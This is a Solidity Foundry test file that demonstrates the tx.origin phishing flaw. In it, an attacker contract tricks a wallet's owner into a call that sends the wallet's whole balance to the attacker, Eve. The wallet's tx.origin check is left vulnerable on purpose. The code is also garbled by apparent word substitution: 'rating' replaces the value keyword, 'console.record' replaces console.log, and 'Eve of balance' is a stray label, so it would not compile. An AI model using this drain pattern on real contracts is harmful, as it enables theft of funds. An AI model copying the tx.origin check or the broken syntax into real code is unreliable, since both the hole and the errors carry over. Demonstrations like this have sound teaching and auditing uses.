pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract PolicyTest is Test {
    PatientWallet WalletAgreement;
    Nurse NurseAgreement;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletAgreement = new PatientWallet{rating: 10 ether}();
        console.record("Owner of wallet contract", WalletAgreement.owner());
        vm.prank(eve);
        NurseAgreement = new Nurse(WalletAgreement);
        console.record("Owner of attack contract", NurseAgreement.owner());
        console.record("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        NurseAgreement.operate();
        console.record("tx origin address", tx.origin);
        console.record("msg.sender address", msg.sender);
        console.record("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract PatientWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {

        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{rating: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Nurse {
    address payable public owner;
    PatientWallet healthWallet;

    constructor(PatientWallet _wallet) {
        healthWallet = PatientWallet(_wallet);
        owner = payable(msg.sender);
    }

    function operate() public {
        healthWallet.transfer(owner, address(healthWallet).balance);
    }
}